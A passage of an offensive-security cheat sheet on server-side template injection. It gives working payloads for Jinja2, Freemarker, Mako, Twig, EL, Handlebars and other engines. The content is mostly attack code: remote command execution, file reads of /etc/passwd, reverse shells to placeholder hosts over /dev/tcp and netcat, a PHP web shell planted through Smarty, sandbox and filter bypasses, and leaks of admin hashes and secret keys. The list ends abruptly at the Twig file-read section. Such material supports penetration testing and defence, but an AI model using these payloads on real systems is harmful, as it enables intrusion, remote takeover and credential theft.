# Server Side Template Injection

> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages

## Summary

- [Templates Injections](#templates-injections)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Methodology](#methodology)
  - [ASP.NET Razor](#aspnet-razor)
    - [ASP.NET Razor - Basic injection](#aspnet-razor---basic-injection)
    - [ASP.NET Razor - Command execution](#aspnet-razor---command-execution)
  - [Expression Language EL](#expression-language-el)
    - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
    - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
    - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
  - [Java - Freemarker](#freemarker)
    - [Freemarker - Basic injection](#freemarker---basic-injection)
    - [Freemarker - Read File](#freemarker---read-file)
    - [Freemarker - Code execution](#freemarker---code-execution)
    - [Freemarker - Sandbox bypass](#freemarker---sandbox-bypass)
  - [Groovy](#groovy)
    - [Groovy - Basic injection](#groovy---basic-injection)
    - [Groovy - Read and create File](#groovy---read-and-create-file)
    - [Groovy - HTTP request:](#groovy---http-request)
    - [Groovy - Command Execution](#groovy---command-execution)
    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
  - [JavaScript - Handlebars](#handlebars)
    - [Handlebars - Command Execution](#handlebars---command-execution)
  - [Jade / Codepen](#jade--codepen)
  - [Java](#java)
    - [Java - Basic injection](#java---basic-injection)
    - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
  - [Django Templates](#django-templates)
  - [Python - Jinja2](#jinja2)
    - [Jinja2 - Basic injection](#jinja2---basic-injection)
    - [Jinja2 - Template format](#jinja2---template-format)
    - [Jinja2 - Debug Statement](#jinja2---debug-statement)
    - [Jinja2 - Dump all used classes](#jinja2---dump-all-used-classes)
    - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
    - [Jinja2 - Read remote file](#jinja2---read-remote-file)
    - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
    - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
      - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
      - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
      - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
      - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
    - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
  - [Java - Jinjava](#jinjava)
    - [Jinjava - Basic injection](#jinjava---basic-injection)
    - [Jinjava - Command execution](#jinjava---command-execution)
  - [JavaScript - Lessjs](#lessjs)
    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
    - [Plugins](#plugins)
  - [JavaScript - Lodash](#Lodash)
    - [Lodash - Basic Injection](#Lodash---Basic-Injection)
    - [Lodash - Command Execution](#Lodash---Command-Execution)
  - [Python - Mako](#mako)
    - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
  - [Java - Pebble](#pebble)
    - [Pebble - Basic injection](#pebble---basic-injection)
    - [Pebble - Code execution](#pebble---code-execution)
  - [Ruby](#ruby)
    - [Ruby - Basic injections](#ruby---basic-injections)
    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
    - [Ruby - List files and directories](#ruby---list-files-and-directories)
    - [Ruby - Code execution](#ruby---code-execution)
  - [PHP - Smarty](#smarty)
  - [PHP - Twig](#twig)
    - [Twig - Basic injection](#twig---basic-injection)
    - [Twig - Template format](#twig---template-format)
    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
    - [Twig - Code execution](#twig---code-execution)
  - [Java - Velocity](#java---velocity)
  - [Java - Spring](#java---spring)
  - [PHP - patTemplate](#pattemplate)
  - [PHP - PHPlib](#phplib-and-html_template_phplib)
  - [PHP - Plates](#plates)
  - [References](#references)


## Tools

* [TInjA](https://github.com/Hackmanit/TInjA) - An effiecient SSTI + CSTI scanner which utilizes novel polyglots
  ```bash
  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
  ```

* [Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
  ```powershell
  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
  ```

* [SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
  ```powershell
  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
  python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
  ```

## Methodology

![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)


## Detection

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :

```
${{<%[%'"}}%\.
```

The [Template Injection Table](https://github.com/Hackmanit/template-injection-table) is an interactive table containing the most efficient template injection polyglots along with the expected responses of the 44 most important template engines.

## ASP.NET Razor

[Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)
> Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.

### ASP.NET Razor - Basic injection

```powershell
@(1+2)
```

### ASP.NET Razor - Command execution

```csharp
@{
  // C# code
}
```

---

## Expression Language EL

[Official website](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)
> Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0

### Expression Language EL - Basic injection

```java
${<property>}
${1+1}

#{<expression string>}
#{1+1}

T(<javaclass>)
```

### Expression Language EL - Properties

* Interesting properties to access `String`, `java.lang.Runtime`

```ps1
${2.class}
${2.class.forName("java.lang.String")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
```

### Expression Language EL - One-Liner injections not including code execution

```java
// DNS Lookup
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}

// JVM System Property Lookup (ex: java.class.path)
${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}

// Modify session attributes
${pageContext.request.getSession().setAttribute("admin",true)}
```

### Expression Language EL - Code Execution

```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using process builder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using JavaClass
T(java.lang.Runtime).getRuntime().exec('whoami').x

// Method using ScriptEngineManager
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
```

---

## Freemarker

[Official website](https://freemarker.apache.org/)
> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic injection

The template can be :

* Default: `${3*3}`  
* Legacy: `#{3*3}`
* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

### Freemarker - Code execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### Freemarker - Sandbox bypass

:warning: only works on Freemarker versions below 2.3.30

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Groovy

[Official website](https://groovy-lang.org/)

### Groovy - Basic injection

Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.

### Groovy - Read and create File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP request:

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Command Execution

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Jade / Codepen

[Official website](https://codepen.io/)
> 

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Java

### Java - Basic injection
> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - Retrieve the system’s environment variables

```java
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Django Templates

Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.

### Detection


```python
{% csrf_token %} # Causes error with Jinja2
{{ 7*7 }}  # Error with Django Templates
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

### Django Templates for post-exploitation

```python
# Variables
{{ variable }}
{{ variable.attr }}

# Filters
{{ value|length }}

# Tags
{% csrf_token %}
```

### Cross-site scripting

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Debug information leak

```python
{% debug %}
```

### Leaking app’s Secret Key

```python
{{ messages.storages.0.signer.key }}
```

### Admin Site URL leak


```
{% include 'admin/base.html' %}
```

### Admin username and password hash leak


```
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

## Jinja2

[Official website](https://jinja.palletsprojects.com/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  

### Jinja2 - Basic injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on a Flask application.

### Jinja2 - Template format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Jinja2 - Debug Statement

If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.

```python
<pre>{% debug %}</pre>
```

Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement

### Jinja2 - Dump all used classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Access `__globals__` and `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - Dump all config variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - Read remote file

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - Write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - Remote Code Execution

Listen for connection

```bash
nc -lnvp 8000
```

#### Jinja2 - Forcing output on blind RCE

You can import Flask functions to return an output from the vulnerable page.

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```


#### Exploit the SSTI by calling os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

We can use these shorter payloads:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/

With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

Source: https://twitter.com/podalirius_/status/1655970628648697860

#### Exploit the SSTI by calling subprocess.Popen

:warning: the number 396 will vary depending of the application.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### Exploit the SSTI by calling Popen without guessing the offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### Exploit the SSTI by writing an evil config file.

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - Filter bypass

```python
request.__class__
request["__class__"]
```

Bypassing `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

Bypassing `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassing `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Jinjava

[Official website](https://github.com/HubSpot/jinjava)
> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).

### Jinjava - Basic injection

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Jinjava - Command execution

Fixed by https://github.com/HubSpot/jinjava/pull/230

```python
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Lessjs

[Official website](https://lesscss.org/)
> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.

### Lessjs - SSRF / LFI

```less
@import (inline) "http://localhost";
// or
@import (inline) "/etc/passwd";
```

### Lessjs < v3 - Command Execution

```less
body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
```

### Plugins

Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.

```less
// example local plugin usage
@plugin "plugin-2.7.js";
```
or
```less
// example remote plugin usage
@plugin "http://example.com/plugin-2.7.js"
```

version 2 example RCE plugin:

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```
version 3 and above example RCE plugin

```javascript
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>

```

### Lodash - Command Execution

```
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## Mako

[Official website](https://www.makotemplates.org/)
> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Direct access to os from TemplateNamespace:

Any of these payloads allows direct access to the `os` module

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)


---

## Pebble

[Official website](https://pebbletemplates.io/)
> Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### Pebble - Basic injection

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - Code execution

Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.

New version of Pebble :

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Ruby

### Ruby - Basic injections

ERB:

```ruby
<%= 7 * 7 %>
```

Slim:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Code execution

Execute code using SSTI for ERB engine.

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for Slim engine.

```powershell
#{ %x|env| }
```

---

## Smarty

[Official website](https://www.smarty.net/docs/en/)
> Smarty is a template engine for PHP.

```python
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

---

## Twig

[Official website](https://twig.symfony.com/)
> Twig is a modern template engine for PHP.

### Twig - Basic injection

```python
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Twig - Template format

```python
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Twig - Arbitrary File Reading

```python
